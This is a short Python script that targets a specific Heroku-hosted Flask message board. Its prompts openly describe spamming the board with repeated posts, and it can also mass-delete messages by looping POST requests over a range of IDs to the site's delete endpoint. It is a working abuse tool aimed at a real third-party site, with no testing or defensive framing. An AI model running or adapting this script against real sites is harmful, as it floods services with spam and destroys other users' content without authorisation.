import requests 
import threading




posturl = "https://flaskmsgboard.herokuapp.com/add_message"
deleteurl = "https://flaskmsgboard.herokuapp.com/deleteid"


def addmessages(amount,content,username,imgurl):
    postdata = {
    "Content": content,
    "Username": username,
    "imgurl": imgurl
    }

    for y in range(amount):
        print(y)
        requests.post(posturl, data=postdata)



def deletemessages(fromid,tillid):
    for n in range(fromid,tillid):
        str(n)
        print(n)
        deletedata = {
            "idform":n
        }   
        requests.post(deleteurl,data=deletedata)
        
        



b = input("True for mass delete and false to addmessages")
if b == "False":
    amount1 = int(input("enter the amount of messages to spam"))
    content1 = input("enter the content to spam")
    username1 = input("Enter the Username to spam")
    imgurl1 = input("Enter the imageurl(optional)")
    addmessages(amount1, content1, username1, imgurl1)
else:
    fromid1 = int(input("enter the id it should delete from"))
    tillid1 = int(input("enter the id to delete till"))
    deletemessages(fromid1,tillid1)
